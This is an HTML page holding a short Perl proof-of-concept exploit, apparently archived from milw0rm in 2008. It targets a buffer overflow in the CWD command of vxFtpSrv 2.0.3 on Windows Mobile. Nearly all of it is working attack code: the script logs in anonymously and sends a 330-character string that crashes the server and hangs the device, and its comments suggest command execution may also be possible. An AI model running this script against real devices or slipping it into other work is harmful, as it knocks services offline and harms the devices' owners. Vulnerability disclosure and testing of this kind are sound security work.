<html><head><title>vxFtpSrv 2.0.3 CWD command Remote Buffer Overflow PoC</title></head><pre>#!/usr/bin/perl
########################################################
#
#  vxFtpSrv 2.0.3 CWD command Overflow PoC
#  by Julien Bedard (www.kosseclab.com)
#  info@kosseclab.com
#
#  Tested on MS Windows Mobile 6.0
#  (maybe other versions are vulnerable)
#
# vxftpsrv is the most common ftp
# server for mobile devices: wm, ppc etc.
# it suffer of an overflow when it recieve too long
# data string by the CWD command.
#
# the result will be immediately close server and
# the windows mobile device will really hang-up.
# so it's required to reset the device to be completely
# operational.
#
# Maybe we can exploit this issue for doing command
# execution but i've not test it since i have nothing
# to debug the application in real time.
#
# If you can help for further analysis please email me
# at info@kosseclab.com
#
########################################################

use Net::FTP;
$wftpsrvaddr = &quot;255.255.255.255&quot;;
$overflow = &quot;A&quot; x 330;
$user = &quot;anonymous&quot;;
$pass = &quot;test@something.com&quot;;
$port = 21;

$ftp = Net::FTP-&gt;new(&quot;$wftpsrvaddr&quot;, Debug =&gt; 0) || die &quot;Cannot connect to ftp server: $@&quot;;
$ftp-&gt;login($user,$pass) || die &quot;Cannot login &quot;, $ftp-&gt;message;

$ftp-&gt;cwd($overflow);
$ftp-&gt;quit;

# milw0rm.com [2008-10-02]</pre></html>